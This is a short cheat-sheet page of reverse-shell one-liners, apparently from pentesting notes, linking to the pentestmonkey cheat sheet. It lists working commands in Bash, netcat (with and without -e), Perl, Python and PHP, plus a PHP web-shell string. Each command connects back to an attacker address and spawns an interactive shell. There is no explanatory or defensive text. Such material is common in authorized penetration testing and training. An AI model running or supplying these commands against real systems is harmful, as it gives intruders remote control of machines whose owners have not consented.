# Shells

{% embed url="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" %}

### Bash

```text
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

### Netcat

```text
nc -e /bin/sh 10.0.0.1 1234
```

### Netcat \(without -e\) 

```text
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

### Perl

```text
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Python

```text
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP

```text
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

'<?php exec(\'/bin/bash -c \"bash -i >& /dev/tcp/192.168.119.124/4445 0>&1\"\'); ?>'
```

